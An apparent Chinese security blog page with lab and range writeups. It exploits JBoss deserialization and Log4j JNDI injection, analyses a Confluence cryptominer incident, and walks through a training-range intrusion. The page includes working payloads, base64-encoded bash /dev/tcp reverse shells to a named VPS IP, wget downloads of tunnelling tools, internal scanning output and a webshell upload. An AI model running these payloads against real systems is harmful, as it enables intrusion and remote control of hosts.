    <span class="token keyword">return</span> <span class="token number">999</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h2 id="项目设置"><a href="#项目设置" class="headerlink" title="项目设置"></a>项目设置</h2><ul>
<li><p>添加编译cpp工程的NDK目录</p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-34-130.png" alt="image-20211224233448071"></p>
</li>
<li><p>指明<code>Android.mk</code>的路径。</p>
<p>在<code>build.gradle(Module: app)</code>中指明<code>Android.mk</code>的路径。</p>
<pre class="language-none"><code class="language-none">android &#123;
    compileSdk 22

    defaultConfig &#123;
        applicationId &quot;com.example.cmake&quot;
        minSdk 21
        targetSdk 22
        versionCode 1
        versionName &quot;1.0&quot;

        testInstrumentationRunner &quot;androidx.test.runner.AndroidJUnitRunner&quot;
    &#125;

    buildTypes &#123;
        release &#123;
            minifyEnabled false
            proguardFiles getDefaultProguardFile(&#39;proguard-android-optimize.txt&#39;), &#39;proguard-rules.pro&#39;
        &#125;
    &#125;
    externalNativeBuild &#123;
        ndkBuild &#123;
            path file(&#39;src&#x2F;main&#x2F;jni&#x2F;Android.mk&#39;)
        &#125;
    &#125;
    compileOptions &#123;
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    &#125;
&#125;</code></pre></li>
</ul>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>在要使用的NDK版本中找到<code>ndk-build</code>，将前面添加入环境变量。</p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-26-564.png" alt="image-20211224232639494"></p>
<p>在makefile目录下输入命令<code>ndk-build</code>。</p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-44-476.png" alt="image-20211224234440421"></p>
<p>编译生成lib以及中间文件在上级目录。</p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-46-315.png" alt="image-20211224234633262"></p>
<h2 id="IDA查看"><a href="#IDA查看" class="headerlink" title="IDA查看"></a>IDA查看</h2><p>用IDA查看编译出来的库，只有一个我们编写的函数，直接F5查看源码。</p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-49-433.png" alt="image-20211224234925397"></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://www.greetdawn.top/2021/12/25/wechat/Android%20Studio%E6%89%8B%E5%8A%A8%E4%BD%BF%E7%94%A8makefile%E7%BC%96%E8%AF%91/" data-id="ckzqi7ikd001gioum1zolfeiv" class="article-share-link">分享到</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cmake/" rel="tag">cmake</a></li></ul>

    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-vulfocus/jboss反序列化-CVE-2015-7501" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/24/vulfocus/jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2015-7501/" class="article-date">
  <time datetime="2021-12-24T09:49:20.000Z" itemprop="datePublished">2021-12-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/vulfocus/">vulfocus</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/24/vulfocus/jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2015-7501/">jboss反序列化(CVE-2015-7501)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Red Hat JBoss Application Server（AS，也称WildFly）是美国红帽（Red Hat）公司的一款基于JavaEE的开源的应用服务器，它具有启动超快、轻量、模块化设计、热部署和并行部署、简洁管理、域管理及第一类元件等特性。 红帽 JBoss A-MQ 6.x；BPM 套件 (BPMS) 6.x；BRMS 6.x 和 5.x；数据网格（JDG）6.x；数据虚拟化 (JDV) 6.x 和 5.x；企业应用平台 6.x、5.x 和 4.3.x；保险丝 6.x; 保险丝维修工程 (FSW) 6.x；运营网络（JBoss ON）3.x；传送门 6.x；SOA 平台 (SOA-P) 5.x；网络服务器（JWS）3.x；红帽 OpenShift/xPAAS 3.x；和 Red Hat Subscription Asset Manager 1.3 允许远程攻击者通过与 Apache Commons Collections (ACC) 库相关的精心设计的序列化 Java 对象执行任意命令。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用 JavaDeserH2HC工具生成序列化数据</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java

java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap ip:port

 <span class="token function">curl</span> http://vulfocus.fofa.so:38046/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211224175451260.png" alt="image-20211224175451260"></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://www.greetdawn.top/2021/12/24/vulfocus/jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2015-7501/" data-id="ckzqi7ikc001cioume90h6ltw" class="article-share-link">分享到</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jboss/" rel="tag">jboss</a></li></ul>

    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-web-security/记confluence的一次溯源" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/17/web-security/%E8%AE%B0confluence%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90/" class="article-date">
  <time datetime="2021-12-17T03:33:39.000Z" itemprop="datePublished">2021-12-17</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Security/">Security</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/17/web-security/%E8%AE%B0confluence%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90/">记confluence的一次溯源</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="记一次confluence挖矿溯源"><a href="#记一次confluence挖矿溯源" class="headerlink" title="记一次confluence挖矿溯源"></a>记一次confluence挖矿溯源</h1><h1 id="1、背景概述"><a href="#1、背景概述" class="headerlink" title="1、背景概述"></a>1、背景概述</h1><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled.png" alt="Untitled"></p>
<h1 id="2、事件分析"><a href="#2、事件分析" class="headerlink" title="2、事件分析"></a>2、事件分析</h1><p>该阿里云的系统客户部署一套了线上的confluence系统，且该系统是部署于我司的虎盾零信任安全访问系统内的，对其公网应用接口的暴露面进行了严格收敛。据得知客户在前天刚好将该收敛系统短暂暴露在公网中，增加其被攻击的可能性，导致最后被注入挖矿病毒。</p>
<p>前期获取客户某员工用户登录账户，获取当前使用的版本为<strong>Confluence 7.9.3</strong></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%201.png" alt="Untitled"></p>
<p>根据该系统版本，在互联网中发现该系统存在远程代码执行漏洞（CVE-2021-26084），且该系统漏洞在八月底被黑产大规模利用执行挖矿程序。</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%202.png" alt="Untitled"></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%203.png" alt="Untitled"></p>
<h1 id="3、攻击分析"><a href="#3、攻击分析" class="headerlink" title="3、攻击分析"></a>3、攻击分析</h1><p>查看系统进程，发现恶意运行进程 ps -ef</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%204.png" alt="Untitled"></p>
<p>根据阿里云告警提示的路径该文件创建的时间为 Dec 13 12:42</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%205.png" alt="Untitled"></p>
<p>下载该路径文件获取矿池地址<a target="_blank" rel="noopener" href="http://j0llychic.com:9999/">j0llychic.com:9999</a></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%206.png" alt="Untitled"></p>
<p>获取该矿池的IP地址165.232.129.60定位为美国的一个矿池地址</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%207.png" alt="Untitled"></p>
<p>用户名和密码：</p>
<p>“user”: “47W42XBUVVm3Nwc1h6dqN9YJm8XiCR5yzBpeiWjpUdAdJdpxT4bHVnoczTDvdG1xtsF3YSD1hJviq5bLFNTPVMcj7sNKvs4”,<br>“pass”: “82b1ee75afa6”,</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%208.png" alt="Untitled"></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%209.png" alt="Untitled"></p>
<p>查看了一下目前恶意进程trace运行情况，该进程cpu占用率为15%，并未太高</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2010.png" alt="Untitled"></p>
<p>系统日志中目前并未发现其他的可疑连接及运行进程</p>
<p>且confluence日志中也并未发现可疑的请求日志记录</p>
<p>目前大概率怀疑黑产是通过CVE-2021-26084漏洞部署的远程挖矿程序，且清空了相应的请求记录</p>
<h1 id="4、病毒清理"><a href="#4、病毒清理" class="headerlink" title="4、病毒清理"></a>4、病毒清理</h1><h2 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> trace
<span class="token function">kill</span> -9 <span class="token number">14387</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2011.png" alt="Untitled"></p>
<h2 id="文件清理"><a href="#文件清理" class="headerlink" title="文件清理"></a>文件清理</h2><p>rm -rf /root/c3pool/</p>
<p>恶意进程不存在</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2012.png" alt="Untitled"></p>
<p>矿池连接已不存在</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2013.png" alt="Untitled"></p>
<h1 id="5、漏洞复现"><a href="#5、漏洞复现" class="headerlink" title="5、漏洞复现"></a>5、漏洞复现</h1><p>漏洞验证，该系统存在<code>CVE-2021-26084</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217113141317.png" alt="image-20211217113141317"></p>
<p>无虎盾收敛，应用面暴露，直接利用</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217112917496.png" alt="image-20211217112917496"></p>
<p>虎盾收敛应用暴露面，已知应用和版本漏洞的情况下，未达成利用</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217112939883.png" alt="image-20211217112939883"></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217112948533.png" alt="image-20211217112948533"></p>
<h1 id="6、总结分析"><a href="#6、总结分析" class="headerlink" title="6、总结分析"></a>6、总结分析</h1><p>该客户系统部署于虎盾零信任安全产品体系下，并未遭受任何攻击，很好的对应用在公网的访问权限进行了严格限制和收敛。由于系统的短暂公网暴露，且该系统存在较新的版本漏洞，而遭受了此次严重的攻击，被黑客部署了挖矿病毒。</p>
<h1 id="7、防范措施"><a href="#7、防范措施" class="headerlink" title="7、防范措施"></a>7、防范措施</h1><h2 id="升级系统版本"><a href="#升级系统版本" class="headerlink" title="升级系统版本"></a>升级系统版本</h2><p>目前官方已在高版本中修复了该漏洞，请受影响的用户升级至安全版本。</p>
<p><a target="_blank" rel="noopener" href="https://www.atlassian.com/software/confluence/download-archives">https://www.atlassian.com/software/confluence/download-archives</a></p>
<p>安全版本列表</p>
<ul>
<li>Atlassian Confluence Server/Data Center 6.13.23</li>
<li>Atlassian Confluence Server/Data Center 7.4.11</li>
<li>Atlassian Confluence Server/Data Center 7.11.6</li>
<li>Atlassian Confluence Server/Data Center 7.12.5</li>
<li>Atlassian Confluence Server/Data Center 7.13.0</li>
</ul>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://www.greetdawn.top/2021/12/17/web-security/%E8%AE%B0confluence%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90/" data-id="ckzqi7ikf001mioum23n5632l" class="article-share-link">分享到</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" rel="tag">溯源分析</a></li></ul>

    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-漏洞研究/log4j2RCE-CVE-2021-44228" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/11/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/" class="article-date">
  <time datetime="2021-12-11T07:39:48.000Z" itemprop="datePublished">2021-12-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Security/">Security</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/11/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/">log4j2RCE(CVE-2021-44228)漏洞利用与分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述:"></a>漏洞描述:</h2><p>Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围:"></a>影响范围:</h2><p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h3><p>编写本地<code>exp</code>类</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>objects<span class="token punctuation">.</span></span><span class="token class-name">XString</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> exp <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// System.out.print("正在执行命令");</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// String[] commands = &#123;"bash", "-i", ">&amp;", "/dev/tcp/139.196.234.164/5555 0>&amp;1"&#125;;</span>
            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
            <span class="token class-name">Process</span> pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"正在执行命令"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>本地编译为<code>class</code>文件</p>
<pre class="language-none"><code class="language-none">javac exp.java</code></pre>

<p>使用<code>marshalsec</code>本地启用恶意监听服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://192.168.1.81:8000/#exp"</span> <span class="token number">7788</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155305869.png" alt="image-20211223155305869"></p>
<p>使用<code>Python3</code>在恶意类文件路径下启动一个简易<code>http</code>服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python3 -m http.server</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155241001.png" alt="image-20211223155241001"></p>
<p>插入恶意<code>payload</code>执行，触发命令执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>192.168.1.81<span class="token operator">:</span>7788<span class="token operator">/</span>exp&#125;</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155523118.png" alt="image-20211223155523118"></p>
<h3 id="线上靶机复现-shell反弹"><a href="#线上靶机复现-shell反弹" class="headerlink" title="线上靶机复现-shell反弹"></a>线上靶机复现-shell反弹</h3><p>使用<code>JNDI</code>启动恶意服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <span class="token string">"x.x.x.x"</span> -p <span class="token number">6666</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155823005.png" alt="image-20211223155823005"></p>
<p>构造攻击payload:</p>
<pre class="language-none"><code class="language-none">payload&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;x.x.x.x:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;Base64&#x2F;YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMzkuMTk2LjIzNC4xNjQvNTU1NSAwPiYx&#125;</code></pre>

<p>注：后面command需要经过一次base64编码，两次URL编码处理</p>
<pre class="language-none"><code class="language-none">command: bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;5555 0&gt;&amp;1</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223160404738.png" alt="image-20211223160404738"></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223160320680.png" alt="image-20211223160320680"></p>
<h3 id="线上靶机复现-回显输出"><a href="#线上靶机复现-回显输出" class="headerlink" title="线上靶机复现-回显输出"></a>线上靶机复现-回显输出</h3><p>使用<code>vulfocus</code>上的靶机测试</p>
<p>用<code>Log4j2 jndi injection fuzz tool</code>对主机进行模糊测试，找到传参点在<code>header</code>头</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228131736368.png" alt="image-20211228131736368"></p>
<p>使用<code>JNDI</code>启动恶意服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <span class="token string">"x.x.x.x"</span> -p <span class="token number">6666</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228131104816.png" alt="image-20211228131104816"></p>
<p>抓包修改<code>header</code>为攻击<code>payload</code></p>
<pre class="language-none"><code class="language-none">X-Api-Version: $&#123;$&#123;env:NaN:-j&#125;ndi$&#123;env:NaN:-:&#125;$&#123;env:NaN:-l&#125;dap$&#123;env:NaN:-:&#125;&#x2F;&#x2F;139.196.234.164:1389&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;
cmd:ls</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228132305371.png" alt="image-20211228132305371"></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>截止到目前，网上的修复方法大致是这些：</p>
<p>补丁链接: <a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">log4j-2.15.0-rc2</a></p>
<p>1.添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；</p>
<p>2.在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；</p>
<p>3.JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://www.greetdawn.top/2021/12/11/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/" data-id="ckzqi7iki0020ioum8sgu38qo" class="article-share-link">分享到</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/log4j2/" rel="tag">log4j2</a></li></ul>

    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-综合渗透/xiyu-new-bachang-cfs" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/" class="article-date">
  <time datetime="2021-12-07T03:12:47.000Z" itemprop="datePublished">2021-12-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/">第三期cfs靶场练习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">payload</span><span class="token operator">=</span><span class="token variable">$&#123;jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>4o5zj6.dnslog.cn<span class="token operator">/</span>cxvahp&#125;</span>
vps：139.196.234.164
<span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/139.196.234.164/5555 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre>

<h1 id="Apache-log4j2漏洞-CVE-2021-44228"><a href="#Apache-log4j2漏洞-CVE-2021-44228" class="headerlink" title="Apache log4j2漏洞(CVE-2021-44228)"></a>Apache log4j2漏洞(CVE-2021-44228)</h1><p>10.134.110.23:8080</p>
<h2 id="flag1-flag-ee5645e88bd351505554be5016ef505e"><a href="#flag1-flag-ee5645e88bd351505554be5016ef505e" class="headerlink" title="flag1: flag{ee5645e88bd351505554be5016ef505e}"></a>flag1: flag{ee5645e88bd351505554be5016ef505e}</h2><p><strong>第一步：</strong></p>
<pre class="language-none"><code class="language-none">payload&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;139.196.234.164:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;Base64&#x2F;YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMzkuMTk2LjIzNC4xNjQvNTU1NSAwPiYx&#125;</code></pre>

<p>注：后面command需要经过一次base64编码，两次URL编码处理</p>
<pre class="language-none"><code class="language-none">command: bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;139.196.234.164&#x2F;5555 0&gt;&amp;1</code></pre>



<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216151433833.png"></p>
<p><strong>第二步：</strong></p>
<ul>
<li>vps监听</li>
</ul>
<pre class="language-none"><code class="language-none">nc -lvvp 5555</code></pre>

<ul>
<li>开启恶意ldap服务</li>
</ul>
<pre class="language-none"><code class="language-none">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i &quot;139.196.234.164&quot; -p 8080</code></pre>

<p>成功上线</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216151543166.png" alt="image-20211216151543166"></p>
<p>10.134.110.23 内网探测</p>
<pre class="language-none"><code class="language-none">root@66f6d6f3234c:&#x2F;tmp# .&#x2F;fscan_amd64 -h 10.134.0.0&#x2F;16
.&#x2F;fscan_amd64 -h 10.134.0.0&#x2F;16

   ___                              _
  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __
 &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &#39;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;
&#x2F; &#x2F;_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____&#x2F;     |___&#x2F;\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.6.3
start infoscan
(icmp) Target &#39;10.134.110.23&#39; is alive
(icmp) Target &#39;10.134.110.1&#39; is alive
(icmp) Target &#39;10.134.110.26&#39; is alive
(icmp) Target &#39;10.134.110.34&#39; is alive
icmp alive hosts len is: 4
10.134.110.34:8093 open
10.134.110.1:22 open
10.134.110.34:8083 open
10.134.110.34:8080 open
10.134.110.26:8080 open
10.134.110.1:8080 open
10.134.110.23:8080 open
10.134.110.34:8009 open
10.134.110.26:8009 open
alive ports len is: 9
start vulscan
[*] WebTitle:http:&#x2F;&#x2F;10.134.110.34:8080 code:200 len:1507   title:Welcome to JBos                                                                                                                                                             s&amp;trade;
[*] WebTitle:http:&#x2F;&#x2F;10.134.110.23:8080 code:404 len:0      title:None
[*] WebTitle:http:&#x2F;&#x2F;10.134.110.1:8080  code:404 len:0      title:None
[+] InfoScan:http:&#x2F;&#x2F;10.134.110.23:8080 [SprintBoot]
[*] WebTitle:http:&#x2F;&#x2F;10.134.110.26:8080 code:200 len:20     title:Apache Tomcat&#x2F;8                                                                                                                                                             .0.43
[+] InfoScan:http:&#x2F;&#x2F;10.134.110.34:8080 [Jboss JBOSS]
[*] WebTitle:http:&#x2F;&#x2F;10.134.110.34:8083 code:400 len:0      title:None
[+] InfoScan:http:&#x2F;&#x2F;10.134.110.1:8080  [SprintBoot]
[+] http:&#x2F;&#x2F;10.134.110.26:8080&#x2F;manager&#x2F;html tomcat tomcat
[+] http:&#x2F;&#x2F;10.134.110.26:8080 poc-yaml-tomcat-manager-week
已完成 8&#x2F;9 [-] ssh 10.134.110.1:22 root 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 8&#x2F;9 [-] ssh 10.134.110.1:22 admin admin123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 8&#x2F;9 [-] ssh 10.134.110.1:22 admin 123321 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 9&#x2F;9
scan end</code></pre>

<p> 部署frp内网穿透工具</p>
<p>使用wget上传文件至外网机</p>
<p>wget <a target="_blank" rel="noopener" href="http://139.196.234.164:8000/frpc">http://139.196.234.164:8000/frpc</a></p>
<p>wget <a target="_blank" rel="noopener" href="http://139.196.234.164:8000/frpc.ini">http://139.196.234.164:8000/frpc.ini</a></p>
<p>frp连接</p>
<p>server:./frps -c frps.ini</p>
<p>client:./frpc -c frpc.ini</p>
<p>10.134.110.26:8080 存在toamcat弱口令部署war包</p>
<p>上传蚁剑马</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216164224261.png" alt="image-20211216164224261"></p>
<p>flag3： flag{a457f1dd3623a399d78a9672d225ddd5}</p>
<p>10.134.110.34:8080 JBOSS 命令执行</p>
<p>flag4：flag{4b0e8838ced75dbb359414892942d19d}</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216172919652.png" alt="image-20211216172919652"></p>
<p>172.78.69.16</p>
<p>172.78.69.15:8080 存在shire反序列化漏洞</p>
<p>flag2: flag{b2a0b3a262c1234132672229af281ed6}</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216184338762.png" alt="image-20211216184338762"></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://www.greetdawn.top/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/" data-id="ckzqi7ikl002cioumayyq96t3" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 丨greetdawn丨<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
